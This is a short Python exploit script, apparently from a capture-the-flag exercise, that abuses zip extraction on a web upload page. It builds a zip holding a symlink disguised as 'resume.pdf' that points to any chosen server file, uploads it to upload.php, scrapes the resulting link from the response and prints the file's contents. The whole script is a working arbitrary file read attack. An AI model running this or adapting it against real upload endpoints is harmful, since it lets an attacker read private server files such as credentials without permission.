#!/usr/bin/python3
import sys
import requests
import io
import zipfile
import re
from datetime import datetime

# Note: thanks to 0xdf for this great script.

# Make sure user implements required cli arguments
if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <IP> <target_file_path>")
    sys.exit()

# Set arguments to a variable
host = sys.argv[1]
filepath = sys.argv[2]

# Creates a file-like object, but its in memory, so we dont have to write the file to disk
zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, "w") as zip_file:
    zipInfo = zipfile.ZipInfo('resume.pdf')
    zipInfo.create_system = 3
    zipInfo.external_attr |= 0xA0000000

    #sets date to something more realistic, or else the date would be set to 1980
    zipInfo.date_time = datetime.now().timetuple()[:6]
    zip_file.writestr(zipInfo, filepath)


files = ('resume.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})
response = requests.post(f'http://{host}/upload.php',
                          files={"zipFile": ('resume.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})},
                          data={"submit": ""}
                          )

#sending request, and using regex to find specified content in response, then writing to stdout
#also, if response/path format is different, just alter to filter for proper path.
(url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', response.text)
response = requests.get(f'http://{host}/{url}')
sys.stdout.buffer.write(response.content)

